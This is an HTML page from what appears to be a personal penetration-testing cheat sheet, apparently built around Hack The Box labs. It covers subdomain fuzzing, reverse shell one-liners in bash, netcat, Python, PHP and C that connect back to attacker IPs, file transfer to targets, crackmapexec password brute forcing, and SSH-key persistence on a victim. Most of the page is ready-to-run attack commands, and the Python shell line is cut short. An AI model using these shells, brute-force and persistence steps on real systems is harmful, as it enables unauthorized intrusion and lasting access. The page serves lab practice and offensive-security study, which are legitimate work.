<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/miscStyles.css">
    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet"/>
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <link rel="icon" type="image/x-icon" href="/H4ckV4ult/images/favicon.png">

    <title>Minimalist Webpage</title>
</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>
    
    <div id="navbar-container"></div>
    <div class="main-container">
        <div class="sidebar">
            <h3>Quick content</h3>
            <ul id="sidebar-menu"></ul>
        </div>

        <div class="notion-container">
            <div class="notion-header">
                <h1 id="Enumeration" class="top">Enumeration</h1>
            </div>
            <h2> Virtual Host (Subdomain) Enumeration (Now using CAIDO)</h2>
            <ul>
                <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
                <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
                <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
                
                <a class="cherry-banner" href="/H4ckV4ult/files/subdomainLister.sh" download="subdomainLister.sh">
                    <img src="/H4ckV4ult/images/file_logo.png"> 
                    <h3>SubdomainLister.sh</h3>
                </a>
                <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
            </ul>

                <div class="notion-header">
                    <h1 id="Webshells">Webshells</h1>
                </div>
                
                <div class="notion-body">
                    <ul>
                        <a class="notion-link" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"> Pentest Monkey - Webshells</a></li>
                        <h2>Bash</h2>
                        <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
                        <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
                        <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"</code></pre>
                        <h2>Python</h2>
                        <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
                        <h2>PHP</h2>
                        <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
                        <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;</code></pre>
                    </ul>
                </div>
            <div class="notion-header">
                <h1 id="Python">Python</h1>
            </div>
            <div class="notion-body">
                <ul>    
                    <h2> Upgrade terminal </h2>
                    <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
                    <pre><code class="language-python">script /dev/null -c bash</code> </pre>
                    
                    
                </div>
            
             <div class="notion-header"> 
                <h1 id="Transfer Files">Transfer Files</h1>
            </div>
            
            <div class="notion-body">
                <ul>
                    <h2>NetCat</h2>
                    <p>Where you recieve the file</p>
                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
                    <p>From where you transfer the file</p>
                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
                </ul>

                <ul>
                    <h2>CertUtil</h2>
                    <p>It's like WGET</p>
                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
                </ul>

                <ul>

                <h2> Python </h2>
                <h3>Quickier way</h3>
                <p>Open Python3 http server</p>
                <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
                <p>Acquire the file you want from  the client</p>
                <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
                
                <h3>Longer way</h3>
                    <h4> Server </h4>
                    <pre><code class="language-python">python3 -c "
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('10.8.0.22', 7777))
        server_socket.listen(1)
        conn, addr = server_socket.accept()
        print(f'Conexión desde {addr}')
        with conn, open('/home/kali/github/file.sh', 'rb') as file:
            while (data := file.read(1024)):
                conn.sendall(data)
        print('Archivo enviado con éxito.')"</code></pre>
                    <h4> Client </h4>
                    <pre><code class="language-python">python3 -c "
    import socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(('10.8.0.22', 7777))
        print('Conectado al servidor.')
        with open('/var//linpeas.sh', 'wb') as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
            </ul>

            <ul>
                <h2>SMB</h2>
                <p>Open smb server</p>
                <pre><code class="language-python">impacket-smbserver share . </code> </pre>
                <p>From windows </p>
                <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
            </ul>

            <ul>
                <h2>SCP</h2>
                <p>From Kali to Windows</p>
                <pre><code class="language-bash">scp /ruta/en/kali/archivo.exe Nadine@10.10.10.184:"C:/Users/Nadine/Desktop/archivo.exe"</code> </pre>
                <p>From Windows to Kali </p>
                <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
            </ul>

            </div>    

            <div class="notion-header"> 
                <h1 id="C">C</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <h2>Reverse shell with C</h2>
                    <pre><code class="language-c">#include &lt;unistd.h&gt;
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/8888 0>&1", NULL);
    return 0;
}
</code></pre>
                </ul> 
            </div>   
            
            <div class="notion-header"> 
                <h1 id="Sync clock rate (Windows)">Sync clock rate (Windows)</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <p>For some windows attacks it is necessary to sync you clock rate with the victim's</p>
                    <p>Check current time</p>
                    <pre><code class="language-bash">timedatectl</code></pre>
                    <p>Sync time with the server</p>
                    <pre><code class="language-bash">sudo ntpdate VICTIM_IP</code></pre>
                    <p>Deactivate sync</p>
                    <pre><code class="language-bash">sudo timedatectl set-ntp true</code></pre>
                    
                </ul>
            </div>

            <div class="notion-header"> 
                <h1 id="Brute Force">Brute Force</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <p>This are several ways of bruteforcing using crackmapexec</p>
                    <pre><code class="language-bash">crackmapexec smb 10.10.10.184 -u USERNAME -p passwords.txt
crackmapexec ftp 10.10.10.184 -u USERNAME -p passwords.txt
crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
                        
                   <h2>Useful wordlists to enum website </h2>

                   <p>Start with directory listing</p>
                   <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-large.txt</code></pre>
                   

                   <h2>In case you coudn't find anything go on with  </h2>
                   <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt     
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt</code></pre>

                    <h2>Finally desperately use</h2>
                    <pre><code class="language-bash">/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt</code></pre>
            </ul>
            </div>


            <div class="notion-header"> 
                <h1 id="Persistance">Persistance</h1>
            </div>

            <div class="notion-body">
                <ul>
                    <p>This is a simple method to persist in a system using SSH. You can apply this process for any user inside the system</p>
                    <p>On your attacker machine generate a public key</p>
                    <pre><code class="language-bash">ssh-keygen

Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): persist
Enter passphrase for "persist" (empty for no passphrase): 
Enter same passphrase again:</code></pre>
                    <p>Change public key file permissions to private key</p>
                    

                    <p>Transfer the public key file to the victim (persist.pub) and add it's content to authorized_keys file </p>
                    <pre><code class="language-bash">cat persist.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali" >> authorized_keys</code></pre>        
                   <p>Connect to the victims using private key</p> 
                   <pre><code class="language-bash">ssh -i persist root@10.10.10.187</code></pre> 
                  
                </ul>
            </div>
            
            
                    
                </ul>
            </div>
    </div>

    <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
    <script>
        
        function generateMenu(){
            const headers = document.querySelectorAll('.notion-container h1');
            const sidebarList = document.querySelector('#sidebar-menu');

            headers.forEach(header => {
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.textContent = header.textContent;
                link.setAttribute('href', `#${header.textContent}`);
                listItem.appendChild(link);
                sidebarList.appendChild(listItem);
            });
        }

        // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
        window.addEventListener('load', generateMenu);
    </script>
</body>
</html>
